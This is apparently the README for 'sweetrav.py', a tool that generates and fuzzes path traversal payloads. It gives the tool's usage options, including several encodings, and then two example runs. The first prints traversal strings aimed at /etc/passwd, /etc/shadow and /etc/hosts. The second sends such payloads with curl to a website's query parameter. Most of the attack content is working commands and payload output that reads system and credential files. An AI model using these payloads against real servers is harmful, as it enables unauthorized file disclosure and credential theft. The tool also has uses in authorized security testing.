## Usage
```
usage: sweetrav.py [-h] [-p PATH] [-d DEPTH] [-s SEPARATOR] [-r RANGE] [-a APPEND] [-ab APPENDBEGIN] [-A APPEND] [-f FUZZ] [-e ENCODING] [-o OUTPUT] [-t] [-n] [-i]

          __    __    _______                  _
         / /   / /   / / ____|                | |
        / /   / /   / / (_____      _____  ___| |_ _ __ __ ___   __
       / /   / /   / / \___ \ \ /\ / / _ \/ _ \ __| '__/ _` \ \ / /
  _ _ / / _ / / _ / /  ____) \ V  V /  __/  __/ |_| | | (_| |\ V /
 (_|_)_(_|_)_(_|_)_/  |_____/ \_/\_/ \___|\___|\__|_|  \__,_| \_/


../../../../../../by_firedragon9511


options:
  -h, --help            show this help message and exit
  -p PATH, --path PATH  pass a path and generate a path traversal paylaod based on this path to bring it back to the root of the system.
  -d DEPTH, --depth DEPTH
                        generate payload using a depth number.
  -s SEPARATOR, --separator SEPARATOR
                        use custom separator instead bar.
  -r RANGE, --range RANGE
                        generate a payload wordlist. Ex.: 1-10.
  -a APPEND, --append APPEND
                        append to final of all payloads.
  -ab APPENDBEGIN, --append-begin APPENDBEGIN
                        append to begin of all payloads.
  -A APPEND, --Append APPEND
                        append to final of all payloads using a list. Ex.: -r 1-10 -A files.txt
  -f FUZZ, --fuzz FUZZ  pass payloads to a script. Ex.: -f "./script.sh FUZZ".
  -e ENCODING, --encoding ENCODING
                        encode all payloads. Available encodings: urlencode, doubleencode, base64, lfi, lfi2. lfi3.
  -o OUTPUT, --output OUTPUT
                        save output to a file (append).
  -t, --trim            replace duplicated bars.
  -n, --no-output       don't print any output if you just want to see the fuzzing output.
  -i                    use stdin pipe.

```
## Some Examples

```
PS C:\sweetrav> python sweetrav.py -r 5-10 -A files.txt
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
../../../../../../../../../etc/passwd
../../../../../../../../../../etc/passwd
../../../../../etc/shadow
../../../../../../etc/shadow
../../../../../../../etc/shadow
../../../../../../../../etc/shadow
../../../../../../../../../etc/shadow
../../../../../../../../../../etc/shadow
../../../../../etc/hosts
../../../../../../etc/hosts
../../../../../../../etc/hosts
../../../../../../../../etc/hosts
../../../../../../../../../etc/hosts
../../../../../../../../../../etc/hosts
```

```
PS C:\travmaker> python sweetrav.py -r 4-10 -a '/etc/passwd' -f 'curl "http://site123.com/?trav.php=FUZZ"' -t
<a href="http://www.site123.com/?trav.php=../../../../etc/passwd">Moved Permanently</a>.

../../../../etc/passwd
<a href="http://www.site123.com/?trav.php=../../../../../etc/passwd">Moved Permanently</a>.

../../../../../etc/passwd
<a href="http://www.site123.com/?trav.php=../../../../../../etc/passwd">Moved Permanently</a>.

../../../../../../etc/passwd
<a href="http://www.site123.com/?trav.php=../../../../../../../etc/passwd">Moved Permanently</a>.

../../../../../../../etc/passwd
<a href="http://www.site123.com/?trav.php=../../../../../../../../etc/passwd">Moved Permanently</a>.

../../../../../../../../etc/passwd
<a href="http://www.site123.com/?trav.php=../../../../../../../../../etc/passwd">Moved Permanently</a>.

../../../../../../../../../etc/passwd
<a href="http://www.site123.com/?trav.php=../../../../../../../../../../etc/passwd">Moved Permanently</a>.

../../../../../../../../../../etc/passwd
```